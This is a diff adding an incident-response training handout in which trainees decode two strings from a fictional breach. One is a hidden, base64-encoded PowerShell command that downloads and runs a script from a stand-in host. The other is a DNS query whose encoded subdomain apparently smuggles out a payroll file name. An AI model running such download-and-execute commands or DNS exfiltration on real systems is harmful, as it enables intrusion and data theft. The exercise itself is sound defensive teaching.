@@ -1,0 +1,12 @@
+NORTHWIND PAYROLL BREACH - SESSION 3 STRINGS (training data)
+These two strings come from the events you found in Session 1 on laptop LT-FIN-07.
+
+STRING A - from the EDR event at 2026-11-16 09:02:41 UTC (process.command_line)
+Copy ONLY the long text after "-enc ":
+
+powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALgBlAHgAYQBtAHAAbABlAC4AbwByAGcALwBhAC4AcABzADEAJwApAA==
+
+STRING B - from the DNS event at 2026-11-16 09:15:03 UTC (dns.question.name)
+Copy ONLY the first part, before the first dot:
+
+nzxxe5dio5uw4zc7obqxs4tpnrwf6ujtfz4gy43yhjygc4tugays6mru.cdn-sync.example.org
